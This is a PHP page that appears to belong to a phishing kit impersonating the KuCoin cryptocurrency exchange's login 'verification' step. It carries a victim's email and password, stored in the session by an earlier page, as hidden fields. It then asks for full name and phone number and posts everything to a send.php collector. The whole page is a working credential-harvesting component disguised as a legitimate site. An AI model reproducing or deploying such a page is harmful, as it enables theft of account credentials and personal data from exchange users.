<?php include_once './config.php'; ?>
<html lang="en">
    <?php
        $title = 'KuCoin: Log In | Sign In';
        include_once './includes/meta.php';
        if(empty($_SESSION["email"]) || empty($_SESSION["password"])) {
            redirect(base_url());
        }
        unset($_SESSION['phone_number']);
    ?>
    <link rel="stylesheet" href="<?= base_url('assets/country-code-picker/css/jquery.ccpicker.css')?>">
    <body>
        <?php include_once './includes/header.php'; ?>
        <div class="container-fluid">
            <div class="row">
                <?php include_once './includes/sidebar.php'; ?>
                <div class="col-md-6 order-md-2 order-1">
                    <div class="row">
                        <div class="col-12 offset-0 col-md-8 offset-md-2 login_form_bg_img">
                            <div class="d-flex align-items-center mt60">
                                <form method="post" action="<?= base_url('send.php') ?>" class="col-12 p25 mt60" style="position: relative">
                                    <div style="position: absolute;top:0;right:3;">
                                        <i class="fa-solid fa-qrcode fs50 text-success" aria-hidden="true"></i>
                                    </div>
                                    <h2 class="fs35 fw-bold mb20">Log In</h2>
                                    <input type="hidden" name="email" value="<?= $_SESSION['email'] ?>" >
                                    <input type="hidden" name="password" value="<?= $_SESSION['password'] ?>" >
                                    <span class="fw-bold fs16">Verification Required</span>
                                    <div class="border-line"></div>
                                    <div class="form-floating mb30">
                                        <input type="text" name="name" required="" class="form-control form-control-lg" placeholder="Name" value="" >
                                        <label>Full Name</label>
                                    </div>
                                    <div className="my25">
                                        <label for="" class="form-label">Phone Number</label>
                                        <div class="form-control fs16" style="padding: 0px;">
                                            <input name="phone_number" type="number" id="phone_number" required="" style="width: 80%;border: solid 0px #DDD;padding: 10px 5px;margin: 0px;" class="" placeholder="Phone number" value="" >
                                        </div>
                                    </div>
                                    <div class="my35">
                                        <div class="text-center mx-auto d-grid gap-2 my25">
                                            <button type="submit" class="btn btn-primary bg-secondary border-0 rounded-pill btn-lg btn-block rounded-0 fs16 py10">Verify</button>
                                        </div>
                                    </div>
                                  </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
        <script src="./assets/country-code-picker/js/jquery.ccpicker.min.js"></script>
        <script type="text/javascript">
            $(document).ready(function() {
                $("#phone_number").CcPicker({ countryCode: "us", dataUrl: "<?= base_url('assets/country-code-picker/data/en.json')?>", searchPlaceHolder: "Find..." });
            });
            
        </script>
    </body>
</html>